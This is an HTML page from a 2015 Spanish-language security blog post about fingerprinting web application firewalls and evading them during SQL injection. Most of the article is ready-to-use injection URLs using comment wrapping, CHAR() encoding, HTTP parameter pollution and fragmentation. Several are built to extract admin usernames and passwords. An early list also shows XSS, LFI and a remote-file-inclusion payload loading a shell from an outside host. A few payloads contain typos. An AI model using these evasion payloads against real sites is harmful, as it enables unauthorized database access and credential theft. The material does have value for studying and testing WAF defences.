@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PWNEANDO El WAF! - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="&nbsp;by [Q]3rv[0][0x1]&nbsp;&nbsp; ------------ Que es un WAF? [0x2]&nbsp;&nbsp; ------------ Reconocimiento de un Firewall de aplicaciones web [0x3 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/12/pwneando-el-waf/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">PWNEANDO El WAF!</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-12T19:20:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:20 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="https://yt3.ggpht.com/-xMF425K4WEM/AAAAAAAAAAI/AAAAAAAAAAA/5KqbFoj_8-A/s900-c-k-no/photo.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="https://yt3.ggpht.com/-xMF425K4WEM/AAAAAAAAAAI/AAAAAAAAAAA/5KqbFoj_8-A/s900-c-k-no/photo.jpg" width="640" /></a></div><div style="text-align: right;">&nbsp;by [Q]3rv[0]</div><b>[0x1]&nbsp;&nbsp; ------------ Que es un WAF?  </b><br /><b>[0x2]&nbsp;&nbsp; ------------ Reconocimiento de un Firewall de aplicaciones web  </b><br /><b>[0x3]&nbsp;&nbsp; ------------ Tecnicas de evacion SQL                                            </b><br /><b>[0x2a] ------------ Utilizando comentarios                       </b><br /><b>[0x2b] ------------ Uso de la funcion CHAR()                        </b><br /><b>[0x2c] ------------ HPP (Polucion de parametros HTTP) </b><br /><b>[0x2d] ------------ HPF (Fragmentacion de parametros HTTP) </b><br /><br /><b>[0x1] Que es un WAF?</b><br /><br />Ultimamente, me fui encontrando con aplicaciones que por algun motivo y siendo vulnerables me saltaban con un error del tipo 501 (method no implementado), o directamente al realizara algun tipo de inyeccion, el servidor me enviava un flag FIN y terminaba paradado con un mensajito de "The concexion was reSet", sospechoso, no?, por esta razon decidi escribir a cerca de los WAF (firewalls de aplicaciones web) <br /><br />Para quien no conozco de su existencia, los WAF se encargan de mediar entre el cliente y servidor, filtrando la entrada de caracteres segun la configuracion de seguridad del mismo.  Existen varios de estos, uno de los mas conocidos es ModSecurity, pero ademas de este muchas aplicaciones corren con:   -Libhtp   -Ironbee  y demas...  <br /><br />Un WAF trabaja en la capa de aplicación, controlando la entrada de datos en protocolos como HTTP/HTTPS/SOAP/XML-RPC y según el trafico que se halle en la blacklist de su configuración enviaran un mensaje de alerta ante determinado vector de ataque tales como:  http://vulnpage/alal.php?vuln=9999<br /><br /><pre class="brush: bash">XSS &lt;script&gt;alert(/waf/)&lt;/script&gt;<br />SQLI http://vulnpage/alal.php?vuln=9999'+or+'5'&gt;='3-- <br />LFI http://vulnpage/alal.php?vuln=../../../../../lol<br />RFI http://vulnpage/alal.php?vuln=http://lol.com/shell.txt?<br />ETC...<br /><br /></pre><b>[0x2] Reconocimiento de un Firewall de aplicaciones web    </b><br /><br />Como descubrimos la presencia de un WAF en la aplicacion?<br />Generalmente las respuestas de tipo:<br /><br />- 501 (method not implemented)  - Conexion reseteada por parte del servidor<br />- Mensaje 403  - Redireccionamiento hacia la pagina de inicio<br /><br />Estos son indicios de la presencia de algun tipo de mediador que nos esta complicando la intrusión!  Una de las maneras de obtener el tipo de waf que protege un servidor, es indagando dentro de las respuestas en las cabeceras http.<br /><br />Para ello, si estamos en duda de que la aplicación corre con un firewall web, podemos usar el buscador shodan, para cersiorarnos de  que en realidad es asi.<br /><br />Dork: "host:"Underterminal.com" Mod_security enabled"  Informacion del tipo y version de WAF en la cabecera Server. <br /><pre class="brush: bash"> <br />HTTP/1.0 200 OK<br />Date: Mon, 10 Sep 2012 20:25:38 GMT <br />Server: Mod_Security 2.5.9 enabled<br />Last-Modified: Wed, 13 Jul 2011 07:12:51 GMT<br />ETag: "c902e9-2c-4a7ee24f602c0"<br />Accept-Ranges: bytes<br />Content-Length: 44<br />Vary: Accept-Encoding,User-Agent<br />Content-Type: text/html&nbsp;</pre>Otra es usando herramientas o scripts que se encarguen de realizar un fingerprinting sobre estos como por ejemplo http-waf-detect.nse, un motor encargado de la deteccion de waf's incorporado en nmap.  Podemos utilizarlo de la siguiente manera:<br /><br /><pre class="brush: bash">nmap -Pn -n -vv -T2 --script=http-waf-detect.nse "TARGET"</pre>Para profundizar sobre Nmap:  <a href="http://resources.infosecinstitute.com/nmap-cheat-sheet-part-4/">http://resources.infosecinstitute.com/nmap-cheat-sheet-part-4/</a> <b>&nbsp;</b><br /><br /><b>[0x3] Tecnicas de Evacion SQL</b><br /><pre><b>[0x3a] Utilizando comentarios</b></pre>Las tecnicas de evacion de waf, se centran en engañar al firewall para inyectar los caracteres que se encuentran en la "Blacklist", hay varios metodos de evacion, veamos algunos implementandolos en inyecciondes SQLI<br /><br />Los comentarios   /*!*/ pueden ser utilizados para vestir a ciertas sentencias que dejan una alerta en la aplicación, veamos el siguiente ejemplo.  El siguiente path es vulnerable a sqli.<br /><br />http://somepage/intranet.php?id=[SQLI]<br /><br />"MYSQL ERROR en la sintaxis"    Enumeramos columnas de la tabla.<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+order+by+5</pre><br />FALSE!, hasta ahora sabemos que la tabla que interactua con el script intranet.php posee 4 columnas, vamos a ver que pasa con la tecnica UNION.<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+UNION+SELECT+1,2,3,4+AND+1=1</pre><br /><br />501 METHOD NOT IMPLEMENTED! LOL!<br /><br />Una vez que se realizo el reconocimiento de algún tipo de WAF en la aplicacion, ya sabemos que hay alguna clausula que esta siendo filtrada por este.  Tratemos de evadir la blacklist, utilizando los tag:   /**/ o /*!*/<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+/*!UNION*/+/*!SELECT*/+1,2,3,4+/*!AND*/+1=1</pre>Bien, hemos logrado saltarnos la pared del WAF.  Utilizando /**/ como %20:   <br /><pre class="brush: sql">http://somepage/intranet.php?id=9999/**//*!UNION*//**//*!SELECT*//**/1,2,3,4/**//*!AND*//**/1=1<br /></pre><br />De ahora en mas podemos ir variando la estructura de la sentencia, una manera seria cortar cada clausula con /**/  Tambien podemos utilizar dobles clausulas en el mismo vector:  <br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+/*UNION*/+UNION+/*SELECT*/+SELECT+1,2,3,4+/*AND*/+1=1</pre><br />Fijense como una esta entre los tags /**/ y otra no.<br /><br /><b>[0x3b] Uso de la funcion CHAR()&nbsp;</b><br /><br />CHAR() es una funcion sql que basicamente transforma un caracter/s en ascii a string.  pP ejemplo<br /><br />q=113  mysql&gt; <br /><pre class="brush: sql">SELECT ASCII('q');</pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-tvxW2SjbZvU/VLSJ6ygD6oI/AAAAAAAAAFo/gI4YV5wiBgM/s1600/ascii.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-tvxW2SjbZvU/VLSJ6ygD6oI/AAAAAAAAAFo/gI4YV5wiBgM/s1600/ascii.png" /></a></div><br />mysql&gt; <br /><pre class="brush: sql">SELECT CHAR(113);</pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-_CrG22DUCG8/VLSKFFzTgwI/AAAAAAAAAFw/b3Z1uExBI_Y/s1600/char.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-_CrG22DUCG8/VLSKFFzTgwI/AAAAAAAAAFw/b3Z1uExBI_Y/s1600/char.png" /></a></div><br /><pre class="brush: sql">SELECT CHAR(91, 81, 93, 51, 114, 86, 91, 48, 93);</pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-O3v-YXD99U0/VLSKOcCIbAI/AAAAAAAAAF4/w3acRD_FSLs/s1600/selectchar.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-O3v-YXD99U0/VLSKOcCIbAI/AAAAAAAAAF4/w3acRD_FSLs/s1600/selectchar.png" height="80" width="320" /></a></div><br />Entonces ya nos podemos ir dando una idea de como ofuscar nuestro vector.<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+UNION+SELECT+1,2,3,4+AND+1=1</pre>Quedaria mas o menos de la siguiente manera vistiendo a UNION &amp; SELECT<br /><br /><pre class="brush: sql">http://somepage/intranet.php?id=9999+CHAR(117, 110, 105, 111, 110)+CHAR(115, 101, 108, 101, 99, 116)+1,2,3,4+AND+1=1<br /></pre><br /><b>[0x3c] HPP (Polucion de parametros HTTP)&nbsp;</b><br /><br />La vulnerabilidad HPP puede ser aprovechada para insertar nuestros vectores en la aplicacion y asi poder decierle al WAF "OWNED BABY!"      Pero que es HPP?????  <br /><br /><div style="text-align: center;"><b>HPP (Polucion de parametros HTTP)</b><br /><b>&nbsp;</b> </div>HPP es una vulnerabilidad web que no tiene muchos años de nacida, fue descubierta en el 2009, esta tecnica se centra en inyectar varios valores en un mismo parametro, bien, ustedes se deben estar preguntando, pero de que me sirve ante la evacion de un firewall web??  <br /><br />Sabemos que los usuarios interactuan con aplicaciones dinamicas a travez de un parametro, hay variable que almacenan varios valores, pero otras que se encargan de almacenar 1 solo valor, en ese tipo de var que pasaria si le introdujeran dos valores diferentes??      <br /><br />Segun la tecnlogia que utilice la aplicacion reaccionara de determinada forma, aca les pongo un par de ejemplos de como toman 2 o mas valores distintas tecnologias web.     <br /><br />ASP.NET/IIS -------------------&gt; concacatena dos o mas valores con una coma  ejemplo: id=q3rv0,[Q]3rV[0] <br /><br />PHP/APACHE ---------------------&gt; imprime el segundo valor de 2<br />ejemplo: id=q3rv0&amp;id=[Q]3rv[0]     <br /><br />lo que se interpretara en el servidor sera el segundo valor [Q]3rv[0]      Bien vallamos a la accion, los WAF's generalmente verifican cadas variable por separado, es decir si utilizamos el siguiente vector para ofucar codigo aprovechando un HPP       <br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999+OR+1=COVERT(INT,(@@VERSION))--<br /></pre><br />Evacion:<br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999+CONVERT(INT&amp;id=(@@VERSION))--<br /></pre><br />Con esto engañariamos al firewall debido a que no podra identificar el vector de ataque entero.  Por lo tanto al tratarse de ASP.NET y sabiendo que concatena dos valores con coma el codigo se ejecutaria de la siguiente manera en el server.<br /><br /><pre class="brush: sql">SELECT user_name FROM usuarios WHERE id= 9999+OR+1=COVERT(INT,(@@VERSION))--<br /></pre><br /><b>OWNEANDO al WAF y obeteniendo la version del DBMS.</b>    <br /><br />Otra manera de darle mas dinamismo a esta tecnica es utilizando /**/ entre las variables  Que pasaria si el WAF nos detectara la inyeccion anterior por que tomaria como ofensivo el vector: <br /><br />id=9999+CONVERT(INT      si desearamos usar mas parametros para evadirlo asi:<br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999&amp;id=OR+1=&amp;id=CONVERT&amp;id=(INT&amp;id=(@@VERSION))--<br /></pre><br />La inyeccion se procesaria de esta manera en la base de datos: <br /><br /><pre class="brush: sql">SELECT user_name FROM usuarios WHERE id=9999,OR+1=,CONVERT,(INT,(@@VERSION))--<br /></pre><br />Esto daria error de sintaxis, para solucionarlo utilizaremos nuestra amiga /**/ vistiendo cada parametro   Quedando de la siguiente manera:      <br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999/*&amp;id=*/OR+1=/*&amp;id=*/CONVERT/*&amp;id=*/(INT&amp;id=(@@VERSION))--<br /></pre><br />Ahora si podemos decir OWNED BABY!<br /><br /><b>[0x3d] HPF (Fragmentacion de parametros HTTP)</b>   <br /><br />La fragmentacion de parametros HTTP me recuerda a cuando utilizamos la opcion -f de nmap para fragmentar paquetes IP y asi evadir las estrictas reglas del firewall, esta tecnica no es muy diferente a la que mencione anteriormente (HPP), la unica diferencia es que podemas usarla algun path que utilize varios parametros  por ejemplo tenemos la siguiente url: <br /><br /><pre class="brush: sql">http://url.com/index.aspx?id=1&amp;nan=2&amp;lala=3<br /></pre><br />Podemos fragmentar el vector de ataque entre las variables id= nan= lala=  Supongamos que el servidor corre coN una base de datos MYSQL que no es muy comun, en su mayoria las web que utilizan tecnologia ASP.NET o ASP, corren con algun SQL SERVER 200*  Inyectando normalmente:     <br /><br /><pre class="brush: sql">http://url.com/index.aspx?id=1 UNION SELECT 1,2,concat(username, 0x3a, password)+FROM+admin+LIMIT+1,1-- &amp;nan=2&amp;lala=3<br /></pre><br />Para fragmentar dicho vector y siempre recordando que ASP.NET concatena 2 o mas valores con , podriamos intentar asi:       <br /><br /><pre class="brush: sql">http://url.com/index.aspx?id=1+UNION+SELECT+1/*&amp;nan=*/2,concat(username, 0x3a, password)/*&amp;lala=*/FROM+admin+LIMIT+1,1--<br /></pre><br />Podemos usar la imaginacion para moldear varios tipos de ataque con ambas tecnicas, recordando siempre y cuando como trabaja y toma los valores la tecnologia que corre en el servidor.<br /><br /><pre class="brush: sql">http://lalala/index.aspx?id=1+UNION+SELECT+1/*&amp;nan=*/[/color]2,concat(username, 0x3a, password)/*&amp;lala=*/FROM+admin+LIMIT+1,1--<br /></pre><br /><div style="text-align: right;">Saludos!!</div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-12T19:20:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:20 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/12/pwneando-el-waf/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/12/pwneando-el-waf/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/12/jugando-con-htaccess/" title="Previous Post: Jugando con .htaccess">&laquo; Jugando con .htaccess</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/12/arbitrary-file-download/" title="Next Post:  Arbitrary File Download"> Arbitrary File Download &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
